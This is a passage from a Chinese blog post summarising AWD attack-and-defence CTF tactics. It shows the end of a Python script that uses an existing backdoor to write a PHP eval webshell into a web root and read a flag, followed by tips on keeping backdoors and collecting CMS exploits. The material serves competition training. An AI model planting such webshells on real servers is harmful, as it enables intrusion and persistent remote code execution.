        payload1 = &#123;shell_passwd: &#39;system(\\&#39;echo &quot;&lt;?php @eval(\\$_POST[atkx]);?&gt;&quot; &gt; /var/www/html/atkx1.php\\&#39;);&#39;&#125;
        res = requests.post(shell_path, payload1)
        print(url + &quot; shell写入成功！！！！！！！&quot;)
        #

        # #payload2通过上传的shell来getflag
        # my_shell_path = url + &quot;/atkx1.php&quot;
        # my_shell_passwd = &quot;atkx&quot;
        # payload2 = &#123;my_shell_passwd: &#39;system(\\&#39;cat /flag\\&#39;);&#39;&#125;
        # res = requests.post(my_shell_path, payload2)
        # print(url,res.text)
    except:
        pass
</code></pre>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.预留后门的权限维持特别重要，不要急着拿flag，往后每一轮预留后门都会减少。</p>
<p>2.AWD一般使用的是cms，尽量多收集一些cms的POC和EXP，以备不时之需。</p>
<p>3.防守注意查看日志看别人是怎么攻击自己的，然后尝试攻击其他人，为了干扰别人，可以先打一波流量，混淆视听。</p>
<p>4.检查后门，保证自己的网站上没有d盾可以扫出来的后门，检查计划任务或者可疑进程。</p>
<p>5.比赛一轮大概几分钟，时间比较紧张，需要提高自己的代码审计能力以及自动化脚本的编写能力，实现自动化攻击。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://DokiDokiy.github.io">Dokiy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://dokidokiy.github.io/2023/07/25/AWD%E6%80%BB%E7%BB%93/">https://dokidokiy.github.io/2023/07/25/AWD%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://DokiDokiy.github.io" target="_blank">Dokiy's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/head.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">文件包含</div></div></a></div><div class="next-post pull-right"><a href="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/" title="xss靶场"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">xss靶场</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Dokiy</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dokidokiy"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AWD-%E8%A7%84%E5%88%99"><span class="toc-number">1.</span> <span class="toc-text">AWD 规则</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E9%A2%84%E7%95%99%E5%90%8E%E9%97%A8"><span class="toc-number">1.1.</span> <span class="toc-text">查找预留后门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">端口扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">攻击思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8"><span class="toc-number">2.2.</span> <span class="toc-text">后门利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.3.</span> <span class="toc-text">一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8Fshell"><span class="toc-number">2.4.</span> <span class="toc-text">隐藏shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E7%9A%84shell"><span class="toc-number">2.5.</span> <span class="toc-text">特殊的shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E6%AD%BB%E9%A9%AC"><span class="toc-number">2.6.</span> <span class="toc-text">不死马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">2.7.</span> <span class="toc-text">权限维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BD%AF%E9%93%BE%E6%8E%A5"><span class="toc-number">2.8.</span> <span class="toc-text">软链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH%E5%BC%B1%E5%AF%86%E7%A0%81%E5%88%A9%E7%94%A8"><span class="toc-number">2.9.</span> <span class="toc-text">SSH弱密码利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.10.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%90%85%E5%B1%8E"><span class="toc-number">2.11.</span> <span class="toc-text">攻击搅屎</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%AE%88%E6%80%9D%E8%B7%AF"><span class="toc-number">3.</span> <span class="toc-text">防守思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%9F%A5%E6%9D%80"><span class="toc-number">3.1.</span> <span class="toc-text">基础查杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%9B%91%E6%8E%A7"><span class="toc-number">3.2.</span> <span class="toc-text">文件监控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#alias%E8%B5%B7%E5%88%AB%E5%90%8D"><span class="toc-number">3.3.</span> <span class="toc-text">alias起别名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%80%E4%B8%8D%E6%AD%BB%E9%A9%AC"><span class="toc-number">3.4.</span> <span class="toc-text">杀不死马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%85%E9%99%A4%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.5.</span> <span class="toc-text">清除反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.6.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">3.7.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">3.8.</span> <span class="toc-text">日志分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">3.9.</span> <span class="toc-text">流量分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#-1"><span class="toc-number">3.10.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF"><span class="toc-number">3.11.</span> <span class="toc-text">WAF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%90%85%E5%B1%8E"><span class="toc-number">3.12.</span> <span class="toc-text">防御搅屎</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E6%89%B9%E9%87%8F%E8%84%9A%E6%9C%AC"><span class="toc-number">4.</span> <span class="toc-text">编写批量脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E5%90%8E%E9%97%A8getflag"><span class="toc-number">4.0.1.</span> <span class="toc-text">1.利用后门getflag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%90%8E%E9%97%A8%E6%89%B9%E9%87%8Fgetflag"><span class="toc-number">4.0.2.</span> <span class="toc-text">2.后门批量getflag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%E5%90%8E%E9%97%A8%E6%89%B9%E9%87%8Fgetflag%E5%B9%B6%E6%8F%90%E4%BA%A4"><span class="toc-number">4.0.3.</span> <span class="toc-text">3.利用后门批量getflag并提交</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8%E5%90%8E%E9%97%A8%E5%86%99shell"><span class="toc-number">4.0.4.</span> <span class="toc-text">4.利用后门写shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含">文件包含</a><time datetime="2023-07-31T07:08:53.000Z" title="发表于 2023-07-31 15:08:53">2023-07-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/25/AWD%E6%80%BB%E7%BB%93/" title="无题">无题</a><time datetime="2023-07-25T15:26:16.389Z" title="发表于 2023-07-25 23:26:16">2023-07-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/21/xss%E9%9D%B6%E5%9C%BA/" title="xss靶场">xss靶场</a><time datetime="2023-07-21T13:30:23.000Z" title="发表于 2023-07-21 21:30:23">2023-07-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/15/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" title="linux基础命令">linux基础命令</a><time datetime="2023-07-15T07:08:38.000Z" title="发表于 2023-07-15 15:08:38">2023-07-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/07/12/ctfhub/" title="ctfhub">ctfhub</a><time datetime="2023-07-12T14:24:10.559Z" title="发表于 2023-07-12 22:24:10">2023-07-12</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Dokiy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>